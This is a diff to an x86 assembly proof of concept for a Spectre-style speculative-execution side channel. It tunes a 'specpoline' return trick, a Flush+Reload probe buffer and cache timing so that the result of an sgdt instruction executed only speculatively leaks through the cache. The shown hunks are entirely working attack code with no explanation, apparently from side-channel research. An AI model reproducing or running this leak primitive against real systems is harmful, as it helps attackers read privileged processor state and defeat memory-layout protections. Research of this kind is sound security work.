@@ -16,11 +16,14 @@ SECTION .data
     buffer:         TIMES 64*256*GAP    db 0
     buffer_end:
 
+    TIMES 64 db 0
+
     ;Timings array
     timings         TIMES 256           dd 0
 
-    gdt_base        dq 0
     gdt_limit       dw 0
+    gdt_base        dq 0
+    
 
 SECTION .code
 
@@ -30,7 +33,7 @@ SECTION .code
     
     specpoline:
         xorps xmm0, xmm0
-        TIMES 40 sqrtpd xmm0, xmm0
+        TIMES 20 sqrtpd xmm0, xmm0
 
         movq rbx, xmm0
         mov QWORD [rsp+rbx], rax
@@ -103,8 +106,6 @@ SECTION .code
         push rdx
         push rsi
 
-        
-
         ;Flush the F+R lines
         call flush
 
@@ -112,18 +113,18 @@ SECTION .code
         lea rsi, [buffer]
         lea rcx, [gdt_base]
         mov DWORD [rcx], 0
-        mov DWORD [rcx+8], 0
+        mov WORD [rcx-2], 0
         sfence
+        lfence
 
         ;Specpoline
-        lea rax, [leak.profile]
+        lea rax, [.profile]
         call specpoline
 
         ;O.O 0
         ; o o o SPECULATIVE PATH
         ;0.0 O
 
-        ;mov ebx, DWORD [rsi + 64*GAP*0]
         sgdt [rcx]
         movzx rcx, BYTE [rcx+rdi]       
         shl rcx, 6 + GAP_SHIFT
@@ -140,6 +141,7 @@ SECTION .code
         call profile
 
     .end:
+
         pop rsi
         pop rdx
         pop rcx
